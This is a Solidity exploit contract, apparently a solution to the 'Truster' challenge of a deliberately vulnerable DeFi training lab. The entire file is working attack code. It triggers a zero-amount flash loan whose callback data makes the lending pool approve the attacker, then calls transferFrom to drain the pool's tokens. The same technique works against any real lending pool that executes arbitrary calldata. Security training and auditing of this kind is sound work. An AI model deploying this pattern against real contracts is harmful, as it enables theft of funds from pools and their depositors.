// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    IERC20 private token;
    TrusterLenderPool private pool;
        
    constructor(address tokenAddress, address poolAddress) {
        token = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function attack(uint256 tokensToSteal) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokensToSteal);
        pool.flashLoan(0 ether, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, tokensToSteal);
    }
}
